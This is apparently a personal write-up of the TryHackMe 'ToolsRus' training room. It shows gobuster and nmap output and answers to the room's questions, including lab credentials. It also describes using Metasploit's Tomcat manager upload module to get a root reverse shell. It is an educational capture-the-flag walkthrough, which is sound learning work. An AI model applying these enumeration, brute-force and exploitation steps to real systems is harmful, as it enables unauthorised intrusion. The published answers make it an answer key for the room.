<p align="center">December 5, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{213}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<p align="center"> <img width="300px" src="https://github.com/user-attachments/assets/87bfefb2-3a82-45ae-a685-941e80cf7917"></p>


<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{ToolsRus}}$$
</h1>
<p align="center">Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit</p>
<p align="center">Access this TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/toolsrus">ToolsRus</a>.</p>
<p align="center">Note tat only subscribers can deploy virtual machines in this room.</p>

                                                              
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/dac4e4d6-5e6f-4a31-af37-ce5e784700f4">
  <img width="700px" src="https://github.com/user-attachments/assets/a1847fb3-6e55-47b2-9355-32e047453a74">
</p>

<br>

<h2>Task 1. Deploy and get hacking<a id='1'></a></h2>

> 1.1. <em>What directory can you find, that begins with a "g"?</em><br><a id='1.1'></a>
>> <strong>guidelines</strong><br>
<p><br></p>

<h3><strong>Gobuster</strong></h3>

<pre><code>root@ip-[THM AttackBox]:~/ToolsRus# gobuster dir -u http://[Target]/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target]/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/guidelines           (Status: 301) [Size: 315] [--> http://[Target]/guidelines/]
/protected            (Status: 401) [Size: 458]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>
<br>

> 1.2. <em>Whose name can you find from this directory?</em><br><a id='1.2'></a>
>> <strong>bob</strong><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/fea45692-c4fd-46f6-b897-712ed62ea7d4)

<br>
<br>


> 1.3. <em>What directory has basic authentication?</em><br><a id='1.3'></a>
>> <strong>protected</strong><br>
<p><br></p>

<h3><strong>Gobuster</strong></h3>

<pre><code>root@ip-[THM AttackBox]:~/ToolsRus# gobuster dir -u http://[Target]/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target]/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/guidelines           (Status: 301) [Size: 315] [--> http://[Target]/guidelines/]
/protected            (Status: 401) [Size: 458]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>
<br>

> 1.4. <em>What is bob's password to the protected part of the website?</em><br><a id='1.4'></a>
>> <strong>bubbles</strong><br>
<p><br></p>


![image](https://github.com/user-attachments/assets/c142d908-fc47-4407-a88a-01918c9ce7a4)

<br>

![image](https://github.com/user-attachments/assets/5593ce7f-1a62-4d5d-8d34-7d3204b29acf)

<br>

> 1.5. <em>What other port that serves a webs service is open on the machine?</em><br><a id='1.5'></a>
>> <strong>1234</strong><br>
<p><br></p>

<p>check Nmap</p>

<br>

> 1.6. <em>What is the name and version of the software running on the port from question 5?</em><br><a id='1.6'></a>
>> <strong>Apache Tomcat/7.0.88</strong><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/b3d7fa2f-e09a-4fdf-af5b-7d8c2cdae079)

<br>

<p>I also tried the following command line to discover the name and version of the service running ...</p>

<pre><code>root@ip-[THM AttackBox]:~/ToolsRus# curl -s http://[Target_IP]:[Target_Port] | grep Tomcat
</code></pre>

<p>and I got ...</p>

![image](https://github.com/user-attachments/assets/700cae60-de36-4b47-8f38-1aebcb69e674)

<br>

> 1.7. <em>Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?</em><br><a id='1.7'></a>
>> <strong>5</strong><br>
<p><br></p>


![image](https://github.com/user-attachments/assets/281d61bf-f022-4f06-97d1-ad24a52b6de5)



<h3><strong>Nmap</strong></h3>

<pre><code>root@[THM AttackBox]:~/ToolsRus# nmap -Pn --script vuln [Target]
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-05 04:24 GMT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     [Redacted]
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for ip-[Target].eu-west-1.compute.internal ([Target])
Host is up (0.00027s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /protected/: Potentially interesting folder (401 Unauthorized)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
1234/tcp open  hotline
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8009/tcp open  ajp13
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:CB:20:AD:D4:FD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 346.53 seconds
</code></pre>

<br>



![image](https://github.com/user-attachments/assets/f5689d66-904d-4b4d-a8c8-7ebceb67812f)

<br>



![image](https://github.com/user-attachments/assets/d2e79e8b-edee-4bae-bc23-299f5b69a43a)


<br>

![image](https://github.com/user-attachments/assets/b7a118fa-8cf5-435b-97c4-68b618ffe9b6)

<br>

![image](https://github.com/user-attachments/assets/f8e460ab-90ce-411e-ba95-3b519910689f)


<br>

> 1.8. <em>What is the server version?</em><br><a id='1.8'></a>
>> <strong>Apache/2.4.18</strong><br>
<p><br></p>

![image](https://github.com/user-attachments/assets/d52eb656-c078-473a-a948-56732ff21309)


> 1.9. <em>What version of Apache-Coyote is this service using?</em><br><a id='1.9'></a>
>> <strong>1.1</strong><br>
<p><br></p>


![image](https://github.com/user-attachments/assets/54108b8c-fc88-4bf6-af13-e95dfc607684)

> 1.10. <em>Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?</em><br><a id='1.10'></a>
>> <strong>root</strong><br>
<p><br></p>

<br>

<p>I used <code>msfconsole -q</code> so that the initial banner was no printed.</p>

<pre><code>root@[THM AttackBox]:~/ToolsRus# msfconsole-q 
msf6 >
</code></pre>

<p>Then I searched for <code>search tomcat</code>, and there were 70 different options.</p>

<p>I decided to search again using <code>tomcat upload</code> and I got 26 options.</p>

<p>I chose <code>exploit/multi/http/tomcat_mgr_upload</code></p>


<pre><code>
msf6 > search tomcat upload
earch tomcat upload

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
...
  7   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
...

Interact with a module by name or index. For example info 26, use 26 or use exploit/multi/http/tomcat_jsp_upload_bypass
After interacting with a module you can manually set a TARGET with set TARGET 'Java Linux'
</code></pre>

<br>

<pre><code>sf6 > use 7
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) ></code></pre>

<br>

<pre><code>msf6 exploit(multi/http/tomcat_mgr_upload) > options</code></pre>

<p><strong>Note</strong>: I you are running <code>THM AttackBox</code>, LHOST will be its IP.</p>

<p>I set LHOST, RHOSTS, RPORT, HttpUsername and HttpPassword.</p>

<p>After updating the <code>options</code>, I used <code>exploit</code> command.</p>

![image](https://github.com/user-attachments/assets/56423d1b-32ed-4759-afeb-022d0d40c09e)

<br>


> 1.11. <em>What flag is found in the root directory?</em><br><a id='1.11'></a>
>> <strong>_____</strong><br>
<p><br></p>

<br>

![image](https://github.com/user-attachments/assets/0c8f0122-7f33-4212-94e8-bdefa684081c)

<br>

![image](https://github.com/user-attachments/assets/485f8352-9437-4067-83a4-20b1314af7f5)







<h2>Room Completed<a id='4'></a></h2>
<p>Keep learning, keep growing!<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/29d77da0-1347-4b00-a6f2-6ffaa543676c"></p>


<h2>My Journey<a id='5'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 5, 2024  | 213      |     1,029 th |        22 nd |    7,452 nd |      92 nd | 59,356   |       455 |



<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/bb4cc2c3-398a-436b-ab5a-50c065694be4"></p>
